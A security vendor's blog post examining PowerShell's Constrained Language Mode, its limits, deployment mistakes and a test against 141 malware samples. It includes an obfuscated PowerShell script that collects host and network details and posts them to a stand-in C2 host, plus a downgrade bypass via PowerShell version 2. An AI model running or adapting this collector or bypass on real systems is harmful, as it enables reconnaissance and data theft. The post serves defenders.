# A Deep Dive into PowerShell's Constrained Language Mode - TeamT5

- **Source :** teamt5
- **URL :** https://teamt5.org/en/posts/a-deep-dive-into-powershell-s-constrained-language-mode/
- **Date :** 2021-02-17

---

Technical Analysis

SubscribeRSS

# A Deep Dive into PowerShell's Constrained Language Mode

2021.02.17Cyber Threat Intelligence

Share: 

## What is Constrained Language Mode and Why it Matters

When PowerShell was [first announced in 2006](https://betanews.com/2006/11/14/windows-powershell-1-0-released/), it was meant to be a flexible command-line shell that features an easy-to-understand yet advanced scripting engine for IT admins. Fast forward to (almost) a decade and a half later, PowerShell has caught up in popularity and has superseded the now-legacy `cmd.exe` in current Windows 10 releases.

However, PowerShell has also been weaponized heavily over the past decade. There is an abundance of PowerShell-based samples all over public sandboxes, and [APTs are known to abuse it whenever possible](https://attack.mitre.org/techniques/T1059/001/). The advanced scripting engine is often utilized to launch fileless/in-memory attacks or [use it as a way around AMSI](https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/). In this post, we will be focusing on a lesser-known feature that can be used to combat this threat: Language Mode.

PowerShell was launched with an option to change its ["Language Mode"](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.2). This Language Mode option allows the user to switch between syntaxes allowed or disallowed. By default, all PowerShell sessions are launched with `FullLanguage`, which permits all the available syntaxes and cmdlets at runtime. There are four total language modes available: `FullLanguage`, `RestrictedLanguage`, `NoLanguage` and finally `ConstrainedLanguage`. In today's topic, we are here to focus on the `ConstrainedLanguage` mode introduced in PowerShell 3.0.

  


### Safer PowerShell Environment

First off, let's take a look at what Microsoft Docs says about the `ConstrainedLanguage` mode:

>   * All cmdlets in Windows modules, and other UMCI-approved cmdlets, are fully functional and have complete access to system resources, except as noted.
> 
>   * All elements of the PowerShell scripting language are permitted.
> 
>   * All modules included in Windows can be imported and all commands that the modules export run in the session.
> 
>   * In PowerShell Workflow, you can write and run script workflows (workflows written in the PowerShell language). XAML-based workflows are not supported and you cannot run XAML in a script workflow, such as by using Invoke-Expression -Language XAML. Also, workflows cannot call other workflows, although nested workflows are permitted.
> 
>   * The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.
> 
>   * The New-Object cmdlet can be used only on allowed types (listed below).
> 
>   * Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.
> 
>   * Type conversion is permitted, but only when the result is an allowed type.
> 
>   * Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.
> 
>   * The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.
> 
>   * Users can get all properties of allowed types. Users can set the values of properties only on Core types. Only the following COM objects are permitted: 
>     * Scripting.Dictionary
> 
>     * Scripting.FileSystemObject
> 
>     * VBScript.RegExp
> 
> 


  


#### No Arbitrary C# Code via Add-Type

> The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.

Many PowerShell-based exploits rely on .NET-based language compilation via `Add-Type` \- and that's already thrown out the window by disallowing arbitrary C# code compilation.

![202101-1.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic1.png)

  


#### Non-whitelisted Types are Prohibited

>   * The New-Object cmdlet can be used only on allowed types (listed below).
> 
>   * Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.
> 
>   * Type conversion is permitted, but only when the result is an allowed type.
> 
>   * Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.
> 
>   * The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.
> 
> 


In laymen's terms, every non-whitelisted type and its methods/properties are blocked from execution. Classes such as `System.Reflection.Assembly`/`System.Convert`/`System.Runtime.CompilerServices` and many more are out-of-reach for threat actors, making code injection or fileless attacks that rely on additional PEs much more difficult.

![202101-2.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic2.png)

  


### Prohibit Complex Scripts from Executing

Given the above limitations, this does mean that legitimate complex scripts may not be able to execute correctly. For instance, if your organization uses a script that utilizes WinForm or WPF (Windows Presentation Framework), those will not work at all.

![202101-3.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic3.png)

Consequentially, modules are affected by this whitelisting system as well. Modules that rely on created types or non-whitelisted type calls will not load properly.

![202101-4.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic4.png)

Therefore, it is crucial to **double-check your organization's scripts** (if you have any) _before_ enrolling this policy to your endpoints.

  


### Require Explicit Feature Enrollment

Since, by default, this language mode is an opt-in feature, the user would either have to call `$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"` at the beginning of each session or add `__PSLockdownPolicy` to the system environment variables (**DO NOT** do this for production. See the section below. Neither of which is ideal and should only be used for debugging, unit testing, or for general testing purposes only.

Instead, the administrator(s) of your organization should deploy via WDAC (Windows Defender Application Control) on Windows 10+ _or_ via AppLocker on Windows 7+. When implemented this way, the attacker will first have to bypass WDAC or AppLocker before gaining full control of a standard PowerShell session. A guideline regarding the deployment for individual or mass number of endpoints can be found under the [Application Control for Windows](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control) article on Microsoft Docs.

  


### Effective Against Scripts, not Standard Cmdlets

It must be made clear that merely enabling Constrained Language Mode is not enough to mitigate the risks PowerShell can bring. While restricting users to a lower-privileged language mode ensures no custom .NET assemblies or code can be executed, this does not stop attackers from crafting malicious scripts from the built-in cmdlets alone. For example, an attacker may still be able to craft a script that collects relevant intel about the computer and send it back to their C2 station.

The following, as an example, will continue to run fine under a PowerShell session with Constrained Language mode enabled.
    
    
    Start-Job -ScriptBlock {
     while($true){
      # MAC address collection
      .("{1}{3}{2}{0}" -f 'ariable', 'S', 't-V', 'e') -Name ("{1}{0}" -f 'ata', 'd') -Value (.("{3}{2}{0}{1}" -f 'Ada', 'pter', 'Net', 'Get-') | .("{1}{0}" -f 'ect', 'sel') ("{1}{0}{3}{2}" -f 'erfac', 'Int', 's', 'eAlia'), ("{0}{1}{2}" -f 'MacA', 'd', 'dress') | &("{3}{2}{0}{1}" -f 'r', 'tTo-Json', 'e', 'Conv') -Compress) > $null
      # OSs + username collection
      .("{2}{0}{1}" -f '-', 'Variable', 'Set') -Name ("{0}{1}" -f 'd', 'ata') -Value (${D`ATa} + (.("{0}{2}{3}{1}" -f 'Ge', 'nce', 't-CimInst', 'a') ("{1}{0}{3}{2}" -f 'ting', 'Win32_Opera', 'em', 'Syst') | .("{0}{1}" -f 'se', 'lect') ("{0}{1}" -f 'na', 'me'), ("{1}{0}" -f 'me', 'CSNa') | &("{2}{3}{1}{0}{4}" -f 'o-Js', 'T', 'Conve', 'rt', 'on') -Compress)) > $null
      # WAN IP collection
      &("{0}{1}{2}{3}" -f 'Set-', 'Vari', 'abl', 'e') -Name ("{1}{0}" -f 'ta', 'da') -Value (${D`AtA} + ((.("{1}{0}" -f 'r', 'iw') -useb ("{1}{0}{2}" -f 'fig', 'ifcon', '.me') -user ("{0}{1}" -f 'cur', 'l'))."cO`NTe`Nt")) > $null
      # Saves data to a temporary file (usually this is done in-memory by threat actors, but in-memory execution purely based on existing cmdlets is either impossible or very difficult)
      .("{1}{0}{2}" -f '-Variabl', 'Set', 'e') -Name ('a') -Value ("$env:temp\$(New-Guid).txt")
      ${Da`Ta} | &("{1}{2}{0}" -f 'le', 'O', 'ut-Fi') ${a}
      # Compresses the file
      &("{3}{0}{2}{1}" -f 'ompr', 'Archive', 'ess-', 'C') -De "$a.zip" -Co ("{0}{1}" -f 'Op', 'timal') -Lit ${a}
      # Sends it back to the C2 station
      &("{1}{0}" -f 'r', 'iw') ("{0}{2}{3}{4}{1}" -f 'h', '00', 'ttp://evil', '.tld:', '80') -method ("{1}{0}" -f 'st', 'po') -body (.("{1}{0}{2}" -f 'Co', 'Get-', 'ntent') -Lit "$a.zip") > $null
      &("{2}{1}{0}" -f 'leep', 't-S', 'Star') -Seconds 2
      }
    }

Additionally, attackers may still be able to call external resources to achieve their goal, such as achieving persistence via `schtask` or placing additional payloads under `shell:startup`. Remember, Constrained Language mode does **NOT** block most existing cmdlets from functioning; in other words, it limits what the threat actor has on their disposal, but does not mean that they cannot make do with vanilla cmdlets or standard Windows applications.

  


#### Beware of `__PSLockdownPolicy`

Aside from weaponizing existing cmdlets, if the admins had "enabled" the language feature via `__PSLockdownPolicy`, then it would be trivial for attackers with administrative privileges to restore the language policy. Let's take a look at what this environment variable actually does.

![202101-5.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic5.png)

We'll see that it has brought us to the `SystemPolicy` class under the `wldpNativeMethods.cs` file. In various articles that reference this environment variable, they would instruct the administrator to set the `__PSLockdownPolicy` variable to `4`. A value of 4 corresponds with the `WLDP_LOCKDOWN_UMCIENFORCE_FLAG` constant, which indicates the enforcement of UMCI (User-mode Code Integrity).

![202101-6.gif](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic6.gif)

The call's parent method happens to be named `GetDebugLockdownPolicy`, which indicates that this behavior was meant to be a debug feature, rather than something that should be in a production environment.

![202101-7.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic7.png)

This theory is further backed up by the statement made by [Matt Graeber](https://twitter.com/mattifestation/status/921509830644269062), a renowned security researcher well-versed in WDAC. Further research also shows this behavior was mentioned by the PowerShell team in its [official post regarding Constrained Language Mode as well](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/):

> As part of the implementation of Constrained Language, PowerShell included an environment variable for debugging and unit testing called `__PSLockdownPolicy`. While we have never documented this, some have discovered it and described this as an enforcement mechanism. This is unwise because an attacker can easily change the environment variable to remove this enforcement. In addition, there are also file naming conventions that enable FullLanguage mode on a script, effectively bypassing Constrained Language.

It must be emphasized that administrators should **NOT** deploy this to their endpoints as a way to enable Constrained Language mode - and be extra mindful when reading through articles regarding security features.

  


### Compatibility with Legacy OSs

Another thing to consider before rolling this feature out to endpoints is legacy OSs. As mentioned at the beginning of this post, Constrained Language mode is only available on PowerShell 3.0 onwards - and Windows 7 ships with PowerShell 2.0 by default.

![202101-8.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic8.png)

While it is possible to install WMF 5.1 on older systems such as Windows 7, these systems likely ship with PowerShell 2.0 as its core component as well, which is susceptible to _downgrade attacks_.

All the attacker needs to do is, instead of starting a standard PowerShell 5.1 session, spawn a PowerShell 2.0 session using `PowerShell.exe -Version 2`. Since `ConstrainedLanguage` mode doesn't exist in that version, it will simply fallback to using `FullLanguage`.

![202101-9.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic9.png)

This is much less of a problem on Windows 10, as PowerShell 5.1 is shipped with the system by default and 2.0 can be removed by using `Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root`. After then, any attempts to launch PowerShell v2 will result in an error message.
    
    
    PS C:\> powershell -v 2
    Encountered a problem reading the registry.  Cannot find registry key SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine. The Windows PowerShell 2 engine is not installed on this computer.

  


## Hypothetical Testing

To see how effective this mode is against hypothetical attacks, we ...

  * gathered 141 recently-submitted unique PowerShell samples as of Jan 27th, 2021. 
    * These samples were randomly chosen and were not handpicked (aside from picking out invalid samples that aren't `*.ps1` scripts) in any way.

  * executed the scripts via `ls -File | %{start-job -scr {iex $args[0]} -arg $_.FullName}`.

  * ran these samples on a system with `ConstrainedLanguage` mode enabled.

  * ran these samples on a Windows 10 (build 19042) system with a non-elevated PowerShell session. 
    * Elevation is taken out of the equation as attackers would have to escalate its privilege first, and by that point there will be bigger problems to worry about.




![202101-10.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic10.png)

  


In our testing,

  * `ConstrainedLanguage` blocked ... 
    * 100% (141/141) of the samples from executing properly. 
      * ... as in reaching their intended goal of launching a TCP shell, loading its next-stage payload, creating usable persistence, etc.

    * 51% (72/141) of the samples that had attempted to create a non-whitelisted type.

    * 50% (71/141) of the samples that had attempted to invoke a method on non-whitelisted type.

    * 26.9% (38/141) of the samples that had attempted to convert a value into a non-whitelisted type.

    * 2.8% (4/141) of the samples that had attempted to set a property on a non-whitelisted type.

  * `ConstrainedLanguage` failed to block ... 
    * 0.7% (1/141) of the samples that had managed to create persistence entries.


  


## Conclusion

Since PowerShell is now [an integral part](https://support.microsoft.com/en-us/windows/powershell-is-replacing-command-prompt-fdb690cf-876c-d866-2124-21b6fb29a45f) of modern Windows OSs, sysadmins should not underestimate the risks that PowerShell can bring to the organization.

In the article, we went through the benefits and drawbacks of `ConstrainedLanguage` and how it performs in a hypothetical test. By enabling the engine feature, the risk of PowerShell-introduced exploitation is greatly lowered - if enrolled properly. Organizations should also consider whether or not the reduced availability of modules and or scripts is worth the tradeoff before enrolling this language policy.

  


*Image courtesy of [Pexels](https://www.pexels.com/)

2021.02.17Cyber Threat Intelligence

Share: 

### Related Post

[Technical Analysis2022.01.03](/en/posts/apache-http-server-vulnerabilty-on-windows-2021/)

#### [Apache HTTP Server Vulnerabilities in Windows (CVE-2021-41773 & CVE-2021-42013)](/en/posts/apache-http-server-vulnerabilty-on-windows-2021/)

vulnerability research , cyber security, Apache HTTP Server, IoC, cyber threat intelligence, threat hunting

![](https://teamt5.org/en/posts/a-deep-dive-into-powershell-s-constrained-language-mode/)